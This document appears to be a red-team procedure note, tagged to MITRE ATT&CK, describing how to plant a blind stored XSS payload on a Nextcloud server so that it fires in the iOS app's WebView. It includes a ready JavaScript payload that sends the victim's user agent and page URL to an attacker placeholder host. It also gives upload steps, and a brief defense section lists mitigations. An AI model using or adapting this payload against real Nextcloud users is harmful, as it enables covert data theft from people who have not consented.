---
tags:
  - file-upload
  - payload-delivery
  - nextcloud
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - iOS
  - Mobile
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-13T23:52:24.425Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 30e1e13c-46be-4566-b8dc-4d5705467264
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-HTML-Payload-to-Nextcloud

## Summary

This procedure involves creating and uploading a malicious HTML file containing JavaScript for data exfiltration to a Nextcloud server, setting up the payload for a Blind Stored XSS attack when shared and opened in the iOS app.

## Description

In the context of exploiting the Nextcloud iOS app's unsanitized WebView, the attacker first crafts an HTML file with embedded JavaScript (e.g., using an img src or XMLHttpRequest to send victim data to a controlled server). The file is uploaded via the Nextcloud web interface. This stored payload remains dormant until shared and opened by a victim in the iOS app, where the WebView executes the JavaScript without sanitization, allowing data theft. Prerequisites include a valid Nextcloud account and an attacker server for receiving data.

## Requirements

1. Valid Nextcloud user account with upload permissions
2. Attacker-controlled server (e.g., with a public IP for exfiltration)
3. Basic HTML/JavaScript knowledge to craft the payload

## Defense

Defensive measures and detection strategies:

- Sanitize or restrict file types in Nextcloud to prevent HTML uploads (e.g., whitelist only office documents)
- Disable JavaScript in WebView or implement content security policies in the iOS app
- Monitor for unusual file shares and uploads containing script tags

## Objectives

1. Store malicious payload on the Nextcloud server for persistence
2. Prepare for delivery to victims via sharing
3. Enable subsequent JavaScript execution in victim context

## Instructions

### Step 1: Craft Malicious HTML Payload

**Context**: Create an HTML file with JavaScript that exfiltrates data like IP, location, and OS to your server. Adapt from known Blind XSS payloads by replacing the exfiltration endpoint with your server's IP.

No command required; use a text editor to create `malicious.html`:

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Exfiltrate data via image src
new Image().src = "http://YOUR_SERVER_IP:PORT/exfil?data=" + encodeURIComponent(navigator.userAgent + "|" + window.location.href);
</script>
</body>
</html>
```

> This payload executes on load, sending browser details to the specified server. Replace `YOUR_SERVER_IP:PORT` with your endpoint.

### Step 2: Upload File to Nextcloud

**Context**: Log in to Nextcloud web interface and upload the file to store it server-side.

Use the web UI: Navigate to the file upload section and select `malicious.html`.

**Expected Output**: File appears in your Nextcloud file list.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- file-upload
- payload-delivery
